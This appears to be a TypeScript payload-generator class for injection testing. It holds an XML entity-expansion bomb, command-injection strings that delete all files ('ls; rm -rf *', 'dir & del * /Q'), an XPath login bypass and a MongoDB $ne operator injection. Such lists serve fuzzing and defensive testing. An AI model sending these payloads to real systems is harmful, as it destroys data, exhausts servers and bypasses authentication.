export default class NoSQL_Injection {
  xmlBomb: string[];
  xpath: string[];
  deleteCommand: string[];
  strings: string[];

  mongoDB: object[];
  objects: object[];

  lastCallStrings: number = 0;
  lastCallObjects: number = 0;
  constructor() {
    this.xmlBomb = [
      `<?xml version="1.0"?>
      <!DOCTYPE data [
      <!ENTITY a "xxxxxxxxxxxxxxxx">
      <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
      <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
      <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
      ]>
      <data>&d;</data>`,
    ];
    this.deleteCommand = ["dir & del * /Q", "ls; rm -rf *"];
    this.xpath = [`admin' or '1'='1`];
    this.strings = [...this.xmlBomb, ...this.deleteCommand, ...this.xpath];

    this.mongoDB = [{ $ne: null }];
    this.objects = [...this.mongoDB];
  }
  randomString(): string {
    this.lastCallStrings++;
    return this.strings[(this.lastCallStrings - 1) % this.strings.length];
  }
}
